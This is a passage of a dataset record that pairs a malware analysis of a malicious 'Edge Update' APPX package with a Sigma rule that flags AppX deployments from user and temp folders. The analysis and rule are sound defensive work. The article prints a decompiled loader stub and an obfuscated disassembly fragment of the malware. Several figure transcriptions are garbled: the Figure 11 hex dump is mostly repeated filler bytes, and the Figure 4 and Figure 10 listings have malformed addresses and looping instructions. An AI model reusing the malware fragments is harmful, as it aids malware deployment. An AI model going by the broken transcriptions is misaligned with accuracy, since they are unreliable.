directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Suspicious AppX Package Locations",
      "id": "5cdeaf3d-1489-477c-95ab-c318559fc051",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            "C:\\Users\\Public\\",
            "/users/public/",
            "C:\\PerfLogs\\",
            "C:/perflogs/",
            "\\Desktop\\",
            "/desktop/",
            "\\Downloads\\",
            "/Downloads/",
            "C:\\Windows\\Temp\\",
            "C:/Windows/Temp/",
            "\\AppdData\\Local\\Temp\\",
            "/AppdData/Local/Temp/"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_package_locations.yml",
    "id": "708"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
